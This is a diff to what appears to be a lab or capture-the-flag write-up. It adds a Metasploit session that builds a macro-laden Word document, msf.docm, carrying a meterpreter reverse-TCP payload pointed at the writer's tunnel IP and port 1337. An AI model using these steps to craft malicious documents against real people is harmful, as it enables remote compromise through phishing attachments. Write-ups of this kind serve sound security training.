@@ -149,6 +149,53 @@ So initilly i tried using the templates ntlm theft provides but both failed, but
 
 ```python
 msf > use exploit/multi/fileformat/office_word_macro
+msf exploit(multi/fileformat/office_word_macro) > options
 
+Module options (exploit/multi/fileformat/office_word_macro):
+
+   Name            Current Setting               Required  Description
+   ----            ---------------               --------  -----------
+   CUSTOMTEMPLATE  /usr/share/metasploit-framew  yes       A docx file that will be used as a template to bu
+                   ork/data/exploits/office_wor            ild the exploit
+                   d_macro/template.docx
+   FILENAME        msf.docm                      yes       The Office document macro file (docm)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.86.128   yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+   **DisablePayloadHandler: True   (no handler will be created!)**
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Microsoft Office Word on Windows
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(multi/fileformat/office_word_macro) > set lhost tun0
+lhost => 10.10.14.61
+msf exploit(multi/fileformat/office_word_macro) > set lport 1337
+lport => 1337
+msf exploit(multi/fileformat/office_word_macro) > run
+[*] Using template: /usr/share/metasploit-framework/data/exploits/office_word_macro/template.docx
+[*] Injecting payload in document comments
+[*] Injecting macro and other required files in document
+[*] Finalizing docm: msf.docm
+[+] msf.docm stored at /home/kali/.msf4/local/msf.docm
 ```
 
+I started by using metasploit to create the file, then throwing my IP and port of choice
+
+```python
+
+```
